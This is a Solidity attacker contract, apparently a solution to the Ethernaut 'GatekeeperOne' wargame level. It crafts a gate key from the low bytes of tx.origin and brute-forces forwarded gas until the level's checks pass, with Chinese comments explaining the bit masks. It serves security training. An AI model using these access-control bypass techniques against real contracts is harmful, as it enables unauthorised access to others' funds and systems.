// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {GatekeeperOne} from "../../src/ethernaut/13_GatekeeperOne/GatekeeperOne.sol";

contract GatekeeperOne_Attacker {
	address player;
	GatekeeperOne coreInst;
	
	constructor(GatekeeperOne coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		uint64 tryKey = 0xFFFFFFFF00000000 | uint16(uint160(tx.origin));
		bytes8 key = bytes8(tryKey);
		checkKey(key);
		
		// 一般选择 8191 * N，N 在 3~10 区间都常用
		uint256 base = 8191 * 5;
		for (uint256 offset = 0; offset < 5000; offset++) {
			(bool success, ) = address(coreInst).call{gas: base + offset}(
				abi.encodeWithSelector(GatekeeperOne.enter.selector, key)
			);
			
			if (success) {
				console.log("HIT gateTwo at offset =", offset);
				return;
			}
		}
		
		revert("Failed !!!!");
	}
	
	function checkKey(bytes8 _gateKey) internal {
		// 从右往左数，1字节、2字节 = 有值，3字节、4字节 = 无值
		// 即，0x000000000000FFFF
		require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "doAttack: invalid gateThree part one");
		
		// 从右往左数，5字节 到 8字节 = 有值
		// 即，0xFFFFFFFF00000000
		require(uint32(uint64(_gateKey)) != uint64(_gateKey), "doAttack: invalid gateThree part two");
		
		// 保留 tx.origin 的最低2个字节
		// 即，0x000000000000????
		require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "doAttack: invalid gateThree part three");
		
		// 如何解决`字节值的同时满足`：
		// 由于 part one 与 part three 都是在计算`最低2个字节`，故，只保留 part three
		// 还需要满足 part two，所以，[part three] | [part two] = 同时满足三个条件。
	}
}
